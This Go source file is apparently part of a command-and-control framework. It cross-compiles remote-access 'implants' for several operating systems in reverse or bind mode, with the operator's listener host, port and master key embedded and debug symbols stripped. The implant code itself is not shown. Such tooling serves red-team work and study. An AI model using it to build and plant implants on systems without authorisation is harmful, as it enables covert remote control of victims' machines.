package api

import (
	"crypto/sha256"
	"database/sql"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
)

// ImplantBuilder handles cross-compilation of implants.
type ImplantBuilder struct {
	DB         *sql.DB // for looking up listener details
	GoPath     string  // resolved full path to go binary
	MasterKey  string  // hex-encoded
	OutputDir  string
}

// BuildResult contains information about a compiled implant.
type BuildResult struct {
	Filename string `json:"filename"`
	FilePath string `json:"-"`
	SHA256   string `json:"checksum"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
}

// BuildRequest contains all parameters for an implant build.
type BuildRequest struct {
	OS             string `json:"os" binding:"required"`
	Arch           string `json:"arch" binding:"required"`
	ListenerID     string `json:"listener_id" binding:"required"`
	ConnectionType string `json:"connection_type"` // "reverse" (default) or "bind"
}

// NewImplantBuilder creates a new builder, resolving the Go binary path.
func NewImplantBuilder(db *sql.DB, masterKey, outputDir string) *ImplantBuilder {
	goPath, err := exec.LookPath("go")
	if err != nil {
		// Search common Go installation paths on different platforms
		goPath = findGoBinary()
	}
	return &ImplantBuilder{
		DB:        db,
		GoPath:    goPath,
		MasterKey: masterKey,
		OutputDir: outputDir,
	}
}

// findGoBinary searches for the Go binary in common installation locations.
func findGoBinary() string {
	candidates := []string{
		// Windows
		`C:\Program Files\Go\bin\go.exe`,
		`C:\Go\bin\go.exe`,
		// Linux / WSL
		`/usr/local/go/bin/go`,
		`/usr/lib/go/bin/go`,
		`/snap/go/current/bin/go`,
		// macOS
		`/opt/homebrew/bin/go`,
		`/usr/local/bin/go`,
		// Also check GOPATH and GOROOT
	}

	// Check GOROOT env
	if goroot := os.Getenv("GOROOT"); goroot != "" {
		path := filepath.Join(goroot, "bin", "go")
		if isExecutable(path) {
			return path
		}
		path = filepath.Join(goroot, "bin", "go.exe")
		if isExecutable(path) {
			return path
		}
	}

	// Try candidate paths
	for _, p := range candidates {
		if isExecutable(p) {
			return p
		}
	}

	// Last resort: try "go" and hope it's in PATH at build time
	return "go"
}

// isExecutable checks if a file exists and is not a directory.
func isExecutable(path string) bool {
	info, err := os.Stat(path)
	if err != nil {
		return false
	}
	return !info.IsDir()
}

// Build compiles an implant for the given parameters.
func (b *ImplantBuilder) Build(req *BuildRequest) (*BuildResult, error) {
	// Validate target
	validOS := map[string]bool{"windows": true, "linux": true, "darwin": true}
	validArch := map[string]bool{"amd64": true, "386": true, "arm64": true}

	if !validOS[req.OS] {
		return nil, fmt.Errorf("unsupported OS: %s", req.OS)
	}
	if !validArch[req.Arch] {
		return nil, fmt.Errorf("unsupported arch: %s", req.Arch)
	}

	// Default connection type
	if req.ConnectionType == "" {
		req.ConnectionType = "reverse"
	}
	if req.ConnectionType != "reverse" && req.ConnectionType != "bind" {
		return nil, fmt.Errorf("unsupported connection type: %s (use 'reverse' or 'bind')", req.ConnectionType)
	}

	// Look up listener details
	serverHost, serverPort, err := b.lookupListener(req.ListenerID)
	if err != nil {
		return nil, fmt.Errorf("looking up listener: %w", err)
	}

	// Build filename
	ext := ""
	if req.OS == "windows" {
		ext = ".exe"
	}
	filename := fmt.Sprintf("implant-%s-%s-%s-%s%d%s",
		req.ConnectionType, req.OS, req.Arch,
		serverHost, serverPort, ext,
	)
	outputPath := filepath.Join(b.OutputDir, filename)

	if err := os.MkdirAll(b.OutputDir, 0755); err != nil {
		return nil, fmt.Errorf("creating output dir: %w", err)
	}

	// Build ldflags with correct target info
	ldflags := fmt.Sprintf(
		"-s -w -X c2/internal/implant.ServerHost=%s -X c2/internal/implant.ServerPort=%d -X c2/internal/implant.MasterKeyHex=%s -X c2/internal/implant.Version=1.0.0",
		serverHost, serverPort, b.MasterKey,
	)

	cmd := exec.Command(
		b.GoPath, "build",
		"-ldflags", ldflags,
		"-o", outputPath,
		"./cmd/implant",
	)
	cmd.Env = append(os.Environ(),
		"GOOS="+req.OS,
		"GOARCH="+req.Arch,
		"CGO_ENABLED=0",
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("build failed: %w\n%s", err, string(output))
	}

	checksum, err := sha256File(outputPath)
	if err != nil {
		return nil, fmt.Errorf("calculating checksum: %w", err)
	}

	return &BuildResult{
		Filename: filename,
		FilePath: outputPath,
		SHA256:   checksum,
		OS:       req.OS,
		Arch:     req.Arch,
	}, nil
}

func (b *ImplantBuilder) lookupListener(listenerID string) (string, int, error) {
	if listenerID == "" {
		return "", 0, fmt.Errorf("listener_id is required")
	}

	var host string
	var port int
	err := b.DB.QueryRow(
		"SELECT host, port FROM listeners WHERE id = ?",
		listenerID,
	).Scan(&host, &port)
	if err != nil {
		return "", 0, fmt.Errorf("listener not found: %s", listenerID)
	}

	// Resolve wildcard bind addresses to a routable IP for the implant
	host = resolveHost(host)

	return host, port, nil
}

// resolveHost replaces wildcard bind addresses with a reachable address.
func resolveHost(host string) string {
	if host != "0.0.0.0" && host != "::" && host != "" {
		return host
	}

	// Try to find a non-loopback IPv4 address
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ipNet, ok := addr.(*net.IPNet); ok {
				ip4 := ipNet.IP.To4()
				if ip4 != nil && !ip4.IsLoopback() && !ip4.IsLinkLocalUnicast() {
					return ip4.String()
				}
			}
		}
	}

	// Fallback: use hostname
	if hostname, err := os.Hostname(); err == nil {
		return hostname
	}

	return "127.0.0.1"
}

func sha256File(path string) (string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	hash := sha256.Sum256(data)
	return hex.EncodeToString(hash[:]), nil
}
